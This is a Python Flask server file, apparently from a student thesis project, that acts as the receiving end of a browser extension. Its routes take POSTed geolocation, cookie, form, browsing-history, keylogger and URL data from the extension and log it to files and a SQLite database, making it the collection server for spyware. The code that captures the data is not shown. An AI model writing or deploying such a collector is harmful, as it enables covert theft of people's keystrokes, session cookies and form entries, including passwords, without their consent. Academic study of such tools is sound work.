
"""Structure of the comments:

The code will be divided by comments in sections. 
Those sections are: Testing, Non_Database_Logging, Communication_Server_Extension, Database
The first section as expected is for testing components of requests and how differents functions work.
Database section Manages all server logic of the database, that can be found in test.sqlite
Non_Database_logging is used in one of the snippets of code to log and understand the data recovered there

General comments Flask:
This is a local server build with flask that use a custom log package for storing the data
Flask for the creation of routes use the decorator @app.route(<route>), each of those is a new page/directory inside the server
Inside each route there is a function with the same name that the route (for comodity), the returns in those function
do a variaty of work. They could be what is expected to be shown in the webpage (an HTML) or the response to a POST or GET requests

Important to note that flask in the @app.route() also allow for (<route>/<type:variable>) syntax

General comments Sqlite:
Each time an operation wants to be realised inside the Sqlite database a connections has to be stablished
This is done by conn = sql.connect(PATH), then a cursos object has to be created that is 
cur = conn.cursor(). The attribute execute(str, values) can traslate the string str to a
query in SQL, the values used in the query have to be indicated with a ? in str and be giving
in the correct order of appearence in values.

Bibliography:
https://stackoverflow.com/questions/20646822/how-to-serve-static-files-in-flask 

How to start the Server:

First start an enviroment with flask, in my case:
conda activate servers

Then execute server with flask being PATH the path to app.py:

"""
#flask --app C:\Users\migue\Documents\TFG\TFGExtension\Server\app run
#importing the necessary libraries
import flask 
from flask import Flask,Response ,request, jsonify #The most used function from flask
import log
import os
#creating an instance of the Flask class. This allows the flask library to now the name and file paths of the server
app = Flask(__name__,
            static_url_path='')



"""TESTING SECTION

route("/") with function hello_world has not use outside of being the root route
route("/initialize") is used for cleaning and restarting any log file and DB
route("/control_server") is used has a default post web for testing purposes
"""

@app.route("/") #Root route for testing, not in use
def hello_world():
    
    return "hello world"

#Create or restart DB and all other logger file
@app.route("/initialize")
def initialize():
    log.main()
    return "Redoing all"



#Default Post route 
@app.route('/control_server', methods=['POST'])
def control_server():
    print(request.get_json(force=True)) #Force any info recived to a json and print it in the console
                                        #Such that any Post can be reed and analize for future implementation
    return "thanks"

"""
NON_DATABASE_LOGGING

Each of this routes and functions has the purpose of Logging formatted information 
received, this is only used by "/Extension". The following distribution is followd
"/g" = geolocation Data
"/c" = Cookie Data
"/f" = Form Data
"/h" = Historial Data
"/k" = KeyLogger Data
"/u" = URL DATA
For better understanding of each of this Datas please go to "/Extension" or "/Server/log.py"

Assume that all of them take the received information and redirec them to the correct fucntion in log.py
The return statement will be ignored by the extension
"""

@app.route("/g", methods=['POST'])
def g():
    log.log("Geo", request.get_data())
    return "Done"
@app.route("/c", methods=['POST'])
def c():
    log.log("Coo", request.get_data())
    return "Done"
@app.route("/f", methods=['POST'])
def f():
    log.log("Form", request.get_data())
    return "Done"
@app.route("/h", methods=['POST'])
def h():
    log.log("His", request.get_data())
    return "Done"
@app.route("/k", methods=['POST'])
def k():
    log.log("Key", request.get_data())
    return "Done"
@app.route("/u", methods=['POST'])
def u():
    log.log("Url", request.get_data())
    return "Done"
